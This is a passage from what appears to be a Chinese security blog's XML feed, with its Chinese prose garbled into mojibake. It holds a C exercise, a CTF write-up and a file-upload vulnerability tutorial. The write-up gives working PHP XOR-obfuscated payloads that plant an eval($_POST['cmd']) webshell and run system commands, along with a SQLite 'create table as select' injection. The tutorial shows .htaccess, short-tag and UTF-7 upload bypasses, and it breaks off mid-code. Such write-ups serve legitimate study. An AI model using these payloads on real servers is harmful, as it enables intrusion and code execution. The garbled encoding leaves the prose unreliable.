å¯†åä¸º32ä½ï¼Œå‡å»$rçš„6ä½åï¼Œä¹Ÿå°±æ˜¯è¯´$sæ˜¯ä»¥0eå¼€å¤´çš„26ä½æ•°</p><p>å¯ä»¥æ˜¯$s=0e111111111111111111111111</p><p>å³<code>s=0e111111111111111111111111&amp;h=s878926199a</code></p><p>å½“ç„¶å¯ä»¥æ˜¯è¿™æ ·çš„</p><p><code>s=0e&amp;h=s878926199a</code></p>]]></content>
      
      
      <categories>
          
          <category> ä¿¡æ¯å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€é“ACMæµ‹è¯•èµ›çš„é¢˜ç›®</title>
      <link href="2020/10/29/%E4%B8%80%E9%81%93ACM%E6%B5%8B%E8%AF%95%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AE/"/>
      <url>2020/10/29/%E4%B8%80%E9%81%93ACM%E6%B5%8B%E8%AF%95%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®ï¼šæŸ¥æ‰¾ç¼ºå¤±çš„å…ƒç´ </p><p>å¤ªä¹…æ²¡åšç±»ä¼¼è¿™ç§é¢˜äº†ï¼Œä¸€é“å¾ˆç®€å•çš„é¢˜ç›®ï¼Œç«Ÿç„¶ç”¨äº†20å¤šåˆ†é’Ÿæ‰åšå‡ºæ¥ğŸ˜¥</p><h2 id="æŸ¥æ‰¾ç¼ºå¤±çš„å…ƒç´ "><a href="#æŸ¥æ‰¾ç¼ºå¤±çš„å…ƒç´ " class="headerlink" title="æŸ¥æ‰¾ç¼ºå¤±çš„å…ƒç´ "></a>æŸ¥æ‰¾ç¼ºå¤±çš„å…ƒç´ </h2><p>æè¿°ï¼šç»™å®šä¸€ä¸ªæ•°ç»„ï¼Œæ‰¾å‡ºå…¶ä¸­çš„æœ€å¤§å€¼nï¼Œè¾“å‡º[0,n]åœ¨è¯¥æ•°ç»„ä¸­ç¼ºå¤±çš„å…ƒç´ ã€‚</p><p>è¾“å…¥ï¼šè¾“å…¥ä»»æ„ä¸ªè‡ªç„¶æ•°ï¼Œå½“è¾“å…¥ä¸º-1æ—¶ï¼Œç»“æŸè¾“å…¥ã€‚</p><p>è¾“å‡ºï¼šè¾“å‡ºç¼ºå¤±çš„å…ƒç´ ï¼Œæ¯ä¸¤ä¸ªå…ƒç´ ä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚</p><a id="more"></a><p>ä¾‹1ï¼š</p><p>è¾“å…¥ï¼š0 1 4 -1</p><p>è¾“å‡ºï¼š2 3</p><p>ä¾‹2ï¼š</p><p>è¾“å…¥ï¼š5 8 -1</p><p>è¾“å‡ºï¼š0 1 2 3 4 6 7</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>â‘  è¾“å…¥æ•°å­—ï¼Œç›´åˆ°è¾“å…¥-1åˆ™åœæ­¢è¾“å…¥</p><p>â‘¡ æ‰¾åˆ°æ•°ç»„ä¸­çš„æœ€å¤§å€¼</p><p>â‘¢ è¾“å‡º[0,n]åœ¨è¯¥æ•°ç»„ä¸­ç¼ºå¤±çš„å…ƒç´ </p><h3 id="â‘ -è¾“å…¥æ•°å­—ï¼Œç›´åˆ°è¾“å…¥-1åˆ™åœæ­¢è¾“å…¥"><a href="#â‘ -è¾“å…¥æ•°å­—ï¼Œç›´åˆ°è¾“å…¥-1åˆ™åœæ­¢è¾“å…¥" class="headerlink" title="â‘  è¾“å…¥æ•°å­—ï¼Œç›´åˆ°è¾“å…¥-1åˆ™åœæ­¢è¾“å…¥"></a>â‘  è¾“å…¥æ•°å­—ï¼Œç›´åˆ°è¾“å…¥-1åˆ™åœæ­¢è¾“å…¥</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"><span class="keyword">while</span>(x != <span class="number">-1</span>)&#123;</span><br><span class="line">a[i++] = x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="â‘¡-æ‰¾åˆ°æ•°ç»„ä¸­çš„æœ€å¤§å€¼"><a href="#â‘¡-æ‰¾åˆ°æ•°ç»„ä¸­çš„æœ€å¤§å€¼" class="headerlink" title="â‘¡ æ‰¾åˆ°æ•°ç»„ä¸­çš„æœ€å¤§å€¼"></a>â‘¡ æ‰¾åˆ°æ•°ç»„ä¸­çš„æœ€å¤§å€¼</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"><span class="keyword">while</span>(x != <span class="number">-1</span>)&#123;</span><br><span class="line">a[i++] = x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> max = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>; j&lt;i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt; max)&#123;</span><br><span class="line">max = a[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="â‘¢-è¾“å‡º-0-n-åœ¨è¯¥æ•°ç»„ä¸­ç¼ºå¤±çš„å…ƒç´ "><a href="#â‘¢-è¾“å‡º-0-n-åœ¨è¯¥æ•°ç»„ä¸­ç¼ºå¤±çš„å…ƒç´ " class="headerlink" title="â‘¢ è¾“å‡º[0,n]åœ¨è¯¥æ•°ç»„ä¸­ç¼ºå¤±çš„å…ƒç´ "></a>â‘¢ è¾“å‡º[0,n]åœ¨è¯¥æ•°ç»„ä¸­ç¼ºå¤±çš„å…ƒç´ </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"><span class="keyword">while</span>(x != <span class="number">-1</span>)&#123;</span><br><span class="line">a[i++] = x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">int</span> max = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>; j&lt;i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt; max)&#123;</span><br><span class="line">max = a[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">int</span> tag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;max; k++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(k == a[j])&#123;</span><br><span class="line">tag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tag == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, k);</span><br><span class="line"><span class="keyword">if</span>(k != max<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">tag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å…¶å®ƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¶å®ƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>èœé¸¡åˆ’æ°´é˜Ÿ writeup</title>
      <link href="2020/10/24/%E8%8F%9C%E9%B8%A1%E5%88%92%E6%B0%B4%E9%98%9Fwriteup/"/>
      <url>2020/10/24/%E8%8F%9C%E9%B8%A1%E5%88%92%E6%B0%B4%E9%98%9Fwriteup/</url>
      
        <content type="html"><![CDATA[<p>æ¯”èµ›ï¼š2020å…¨å›½å·¥ä¸šäº’è”ç½‘å®‰å…¨æŠ€æœ¯æŠ€èƒ½å¤§èµ›  å­¦ç”Ÿç»„</p><p>æ­£å¦‚é˜Ÿåä¸€æ ·ï¼Œæˆ‘ä»¬åªæ˜¯æ¥åˆ’æ°´çš„ç­¾åˆ°é€‰æ‰‹</p><a id="more"></a><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>æ‹¼å›¾ï¼Œæ‹¼å®Œå°±å¯ä»¥å¾—åˆ°flag</p><p><a href="https://imgchr.com/i/BZ3GXn"><img src="https://s1.ax1x.com/2020/10/24/BZ3GXn.png" alt="BZ3GXn.png"></a></p><ul><li>flag</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;welcome_to_chinaiisc2020&#125;</span><br></pre></td></tr></table></figure><h2 id="SimpleCalculator"><a href="#SimpleCalculator" class="headerlink" title="SimpleCalculator"></a>SimpleCalculator</h2><p>ä¸çŸ¥é“æ€ä¹ˆç”¨è¿™ä¸ªè®¡ç®—å™¨æ¥è®¡ç®—ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå°è¯•ç”¨ <strong>?search</strong> ä¼ å‚</p><p><a href="https://imgchr.com/i/BZwcxf"><img src="https://s1.ax1x.com/2020/10/24/BZwcxf.png" alt="BZwcxf.png"></a></p><p><a href="https://imgchr.com/i/BZwoin"><img src="https://s1.ax1x.com/2020/10/24/BZwoin.png" alt="BZwoin.png"></a></p><p>å°è¯•ä½¿ç”¨å¼‚æˆ–ç»•è¿‡</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//è¾“å‡º_GET</span></span><br></pre></td></tr></table></figure></blockquote><ul><li>æ„é€ phpinfo()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"></span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/BZ0FsO"><img src="https://s1.ax1x.com/2020/10/24/BZ0FsO.png" alt="BZ0FsO.png"></a></p><ul><li>æ„é€ webshell</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=<span class="keyword">eval</span>($_POST[%<span class="number">27</span>cmd%<span class="number">27</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">//$&#123;_GET&#125;[assert]($&#123;_GET&#125;[eval($_POST[%27cmd%27])]);</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨èšå‰‘æŸ¥çœ‹</p><blockquote><p><code>http://eci-2ze7n0wiyptutv9upaxm.cloudeci1.ichunqiu.com/flag.php?search=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27])</code></p></blockquote><p><a href="https://imgchr.com/i/BeJGrj"><img src="https://s1.ax1x.com/2020/10/25/BeJGrj.png" alt="BeJGrj.png"></a></p><p>åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p><ul><li>flag</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;08768680-a69a-42f1-b515-4220cf7e9a0d&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®ƒæ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?search=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff=system&amp;%a0=cat%<span class="number">20</span>/flag</span><br><span class="line"></span><br><span class="line"><span class="comment">//?search=$&#123;_GET&#125;&#123;system&#125;($&#123;_GET&#125;&#123;cat /flag&#125;);</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/BeJ0RU"><img src="https://s1.ax1x.com/2020/10/25/BeJ0RU.png" alt="BeJ0RU.png"></a></p><h2 id="SQLManager"><a href="#SQLManager" class="headerlink" title="SQLManager"></a>SQLManager</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/200927#h3-6">https://www.anquanke.com/post/id/200927#h3-6</a></p><p>é¢˜ç›®è¯´è¿™æ˜¯ä¸ª<strong>ç®€æ˜“çš„SQLiteç®¡ç†å™¨ã€‚</strong></p><p>è€ŒSQLiteç®¡ç†å™¨æœ‰ä¸€ä¸ªè‡ªåŠ¨åˆ›å»ºçš„åº“<code>sqlite_master</code>ï¼Œé‡Œé¢ä¿å­˜äº†æ‰€æœ‰è¡¨åä»¥åŠåˆ›å»ºè¡¨æ—¶çš„createè¯­å¥ã€‚åœ¨åˆ›å»ºè¡¨æ—¶å¯ä»¥ç”¨<code>as</code>æ¥å¤åˆ¶å¦ä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»ä¸­è·å–åˆ°flagçš„è¡¨åå’Œå­—æ®µåã€‚</p><p>åœ¨å»ºè¡¨ç•Œé¢ç”¨burp suiteæŠ“åŒ…ï¼Œé‡æ”¾åŒ…å¾—åˆ°flagçš„è¡¨åå’Œå­—æ®µå</p><p><a href="https://imgchr.com/i/BZGcFK"><img src="https://s1.ax1x.com/2020/10/24/BZGcFK.png" alt="BZGcFK.png"></a></p><p><strong><code>table_name=a as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=INTEGER</code></strong></p><p><a href="https://imgchr.com/i/BZJ49U"><img src="https://s1.ax1x.com/2020/10/24/BZJ49U.png" alt="BZJ49U.png"></a></p><p><a href="https://imgchr.com/i/BZJv9O"><img src="https://s1.ax1x.com/2020/10/24/BZJv9O.png" alt="BZJv9O.png"></a></p><p>è¿™é‡Œå¯ä»¥å¾—çŸ¥flagæ‰€åœ¨çš„è¡¨ï¼š<strong>flag_Y0U_c4nt_GUESS</strong>ï¼Œä»¥åŠæ‰€åœ¨çš„å­—æ®µï¼š<strong>flag_ThE_C0lumn</strong></p><p>åˆ è¡¨åå†æ¬¡æŠ“åŒ…ï¼Œè¡¨åä¸º <code>b</code> ï¼Œç»§ç»­ç”¨burp suiteé‡æ”¾åŒ…</p><p>å°†<strong>a</strong>æ”¹ä¸º<strong>b</strong>ï¼Œ<strong>sql</strong>æ”¹ä¸º<strong>flag_Y0U_c4nt_GUESS</strong>ï¼Œå°†<strong>sqlite_master</strong>æ”¹ä¸º<strong>flag_ThE_C0lumn</strong></p><p><strong><code>table_name=b as select [flag_ThE_C0lumn] as[&amp;columns[0][name]=]from flag_Y0U_c4nt_GUESS;&amp;columns[0][type]=INTEGER</code></strong></p><p><a href="https://imgchr.com/i/BZtflF"><img src="https://s1.ax1x.com/2020/10/24/BZtflF.png" alt="BZtflF.png"></a></p><ul><li>flag</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;486756b1-d23c-4236-b44c-cd43640098c6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
      <link href="2020/10/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/10/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>ä¸€äº›webåº”ç”¨ç¨‹åºä¸­å…è®¸ä¸Šä¼ å›¾ç‰‡ï¼Œæ–‡æœ¬æˆ–è€…å…¶ä»–èµ„æºåˆ°æŒ‡å®šçš„ä½ç½®ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´å°±æ˜¯åˆ©ç”¨è¿™äº›å¯ä»¥ä¸Šä¼ çš„åœ°æ–¹å°†æ¶æ„ä»£ç æ¤å…¥åˆ°æœåŠ¡å™¨ä¸­ï¼Œå†é€šè¿‡urlå»è®¿é—®ä»¥æ‰§è¡Œä»£ç ã€‚</p><p>é€šå¸¸é€ æˆæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› æ˜¯ï¼šå¯¹äºä¸Šä¼ æ–‡ä»¶çš„åç¼€åï¼ˆæ‰©å±•åï¼‰ï¼Œç±»å‹ï¼Œä»¥åŠå†…å®¹æ²¡æœ‰åšå¥½ä¸¥æ ¼çš„é™åˆ¶ç­‰ç­‰ä¸€äº›åŸå› ã€‚</p><blockquote><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”±äºç¨‹åºå‘˜æœªå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œè€Œå¯¼è‡´çš„ç”¨æˆ·å¯ä»¥è¶Šè¿‡å…¶æœ¬èº«æƒé™å‘æœåŠ¡å™¨ä¸Šä¸Šä¼ å¯æ‰§è¡Œçš„åŠ¨æ€è„šæœ¬æ–‡ä»¶ã€‚è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ã€‚</p><p>è¿™ç§æ”»å‡»æ–¹å¼æ˜¯æœ€ä¸ºç›´æ¥å’Œæœ‰æ•ˆçš„ï¼Œâ€œæ–‡ä»¶ä¸Šä¼ â€æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œæœ‰é—®é¢˜çš„æ˜¯æ–‡ä»¶ä¸Šä¼ åï¼ŒæœåŠ¡å™¨æ€ä¹ˆå¤„ç†ã€è§£é‡Šæ–‡ä»¶ã€‚å¦‚æœæœåŠ¡å™¨çš„å¤„ç†é€»è¾‘åšçš„ä¸å¤Ÿå®‰å…¨ï¼Œåˆ™ä¼šå¯¼è‡´ä¸¥é‡çš„åæœã€‚</p></blockquote><a id="more"></a><h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2><h3 id="htaccessä»»æ„æ–‡ä»¶è§£æ"><a href="#htaccessä»»æ„æ–‡ä»¶è§£æ" class="headerlink" title=".htaccessä»»æ„æ–‡ä»¶è§£æ"></a>.htaccessä»»æ„æ–‡ä»¶è§£æ</h3><blockquote><p>.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ï¼Œè‡ªå®šä¹‰404é”™è¯¯é¡µé¢ï¼Œæ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ï¼Œåªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p></blockquote><p>å½“æœåŠ¡å™¨æ˜¯ä¸Šä¼ ä½¿ç”¨çš„æ˜¯é»‘åå•æœºåˆ¶ï¼Œä½†æ˜¯é”æ­»äº†ä¸ç»™ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨.htaccessæ–‡ä»¶é‡æ–°é…ç½®å½“å‰æ–‡ä»¶çš„è§£æåç¼€ä¸ºå…¶ä»–åç¼€ç»•è¿‡å¯¼è‡´å…¶ä»–åç¼€çš„æ–‡ä»¶è¢«è§£æä¸ºphpã€‚å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><blockquote><p>.htaccessæ–‡ä»¶é…ç½®ä¿¡æ¯,è¿™é‡Œå°†åç¼€ä¸º.aaaçš„æ–‡ä»¶å‡è§£æä¸ºphpæ–‡ä»¶</p></blockquote><h3 id="çŸ­æ ‡ç­¾ç»•è¿‡"><a href="#çŸ­æ ‡ç­¾ç»•è¿‡" class="headerlink" title="çŸ­æ ‡ç­¾ç»•è¿‡"></a>çŸ­æ ‡ç­¾ç»•è¿‡</h3><p>å‡è®¾<code>&lt;?php</code> è¢«è¢«è¿‡æ»¤ï¼ŒåŒæ—¶PHPç‰ˆæœ¬ä¸º5å¯ä»¥ä½¿ç”¨æ®µæ ‡ç­¾ç»•è¿‡ã€‚</p><ul><li>JSé£æ ¼</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>çŸ­æ ‡ç­¾é£æ ¼</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>&lt;?=?&gt;</code>ä¸<code>&lt;?php echo ....?&gt;</code>ç­‰æ•ˆ</p></blockquote><ul><li>ASPé£æ ¼</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% phpinfo();%&gt;</span><br></pre></td></tr></table></figure><ul><li>å®˜æ–¹é»˜è®¤é£æ ¼</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç‰¹æ®Šç¼–ç ç»•è¿‡-UTF-7"><a href="#ç‰¹æ®Šç¼–ç ç»•è¿‡-UTF-7" class="headerlink" title="ç‰¹æ®Šç¼–ç ç»•è¿‡(UTF-7)"></a>ç‰¹æ®Šç¼–ç ç»•è¿‡(UTF-7)</h3><p>å¦‚æœç¨‹åºè¿‡æ»¤äº†æ‰€æœ‰æ ‡ç­¾å½¢å¼ã€æˆ–è€…è¯´è¿‡æ»¤äº†<code>&lt;?</code>è€Œä¸”PHPæ˜¯åœ¨PHP7ä»¥ä¸Šç‰ˆæœ¬ï¼ˆPHP7å·²ç»å°†å…¶ä»–æ ‡ç­¾å½¢å¼è¿‡æ·˜æ±°ï¼Œä»…å‰©ä¸‹<code>&lt;?php</code>å½¢å¼ï¼‰ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨<code>.htaccess</code>è§£ç å¯¹åº”çš„æ–‡ä»¶ï¼Œä¾‹å¦‚å¯ä»¥ä½¿ç”¨UTF-7è¿›è¡Œè§£ç ï¼š(<a href="https://www.novel.tools/encode/UTF-7%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E7%BC%96%E7%A0%81%E5%92%8C%E8%A7%A3%E7%A0%81UTF-7%EF%BC%89">https://www.novel.tools/encode/UTF-7è¿™ä¸ªç½‘ç«™å¯ä»¥ç¼–ç å’Œè§£ç UTF-7ï¼‰</a></p><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 